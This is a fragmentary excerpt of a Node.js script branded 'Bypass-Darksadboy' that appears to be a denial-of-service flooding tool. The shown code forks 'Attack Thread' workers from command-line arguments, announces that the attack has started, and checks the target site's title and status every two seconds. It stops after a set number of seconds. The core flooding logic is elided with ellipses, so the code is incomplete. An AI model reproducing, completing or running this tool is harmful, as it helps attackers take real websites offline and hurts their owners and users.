...
const getCurrentTime = () => {
 ...
 const timeoutPromise = new Promise((resolve, reject) => {
   setTimeout(() => {
     reject(new Error('[Bypass-Darksadboy] Request Timed Out'));
   }, 5000);
 });
 ...
 Promise.race([axiosPromise, timeoutPromise])
   .then((response) => {
     ...
     console.log(`${getCurrentTime()} [Bypass-Darksadboy]  Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
   })
   .catch((error) => {
     if (error.message === '[Bypass-Darksadboy] Request Timed Out') {
       console.log(`${getCurrentTime()} [Bypass-Darksadboy]  Request Timed Out`);
     } else if (error.response) {
       const extractedTitle = getTitleFromHTML(error.response.data);
       console.log(`${getCurrentTime()} [Bypass-Darksadboy]  Title: ${extractedTitle} `);
     } else {
       console.log(`${getCurrentTime()} [Bypass-Darksadboy]  ${error.message}`);
     }
   });
}
...
`);
 ...
 for (let i = 1; i <= process.argv[5]; i++){
   cluster.fork();
   console.log(`${getCurrentTime()} [Bypass-Darksadboy]  Attack Thread ${i} Started`);
 }
 console.log(`${getCurrentTime()} [Bypass-Darksadboy]  The Attack Has Started`);
 setInterval(getStatus, 2000);
 setTimeout(() => {
   console.log(`${getCurrentTime()} [Bypass-Darksadboy]  The Attack Is Over`);
   process.exit(1);
 }, process.argv[3] * 1000);
} 
